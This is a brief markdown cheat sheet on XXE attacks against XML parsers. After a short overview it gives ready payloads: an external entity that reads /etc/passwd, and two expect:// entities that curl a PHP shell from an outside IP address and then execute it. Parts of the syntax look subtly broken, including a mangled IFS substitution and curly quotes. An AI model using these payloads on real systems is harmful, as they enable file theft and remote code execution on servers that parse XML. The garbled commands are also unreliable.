## XXE Attacks
XXE (XML External Entity) attacks exploit weak XML parsers, potentially causing data leaks, denial of service, and more.
- Allows attacker to interfere with the processing of XML data
- can allows to view files on the server and to interact with the server, backend and external systems
- can be used to perform SSRF attacks (Server Side Request Forgery)
- popular recently affects applications that parse XML (SOAP)


### How it works
more Infos: [XXE Mitigation Guide](https://www.indusface.com/blog/how-to-identify-and-mitigate-xxe-vulnerability/)
```XML
<!-- in XML Tags can be named any way -->
<anything>content</anything>
```
We can attempt to read data from filesystem
```XML
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM “file:///etc/passwd”>
]>

<foo>&xxe;</foo>
```

### reverse shell with XXE
Curl the shell
```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "expect://curl$IFS-0&IFS'192.254.1.3:8000/shell.php'"> ]>
<userInfo>
    <user>&xxe;</user>
</userInfo>
```
Execute the shell
```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "expect://php$IFS'shell.php'"> ]>
<userInfo>
    <user>&xxe;</user>
</userInfo>
```
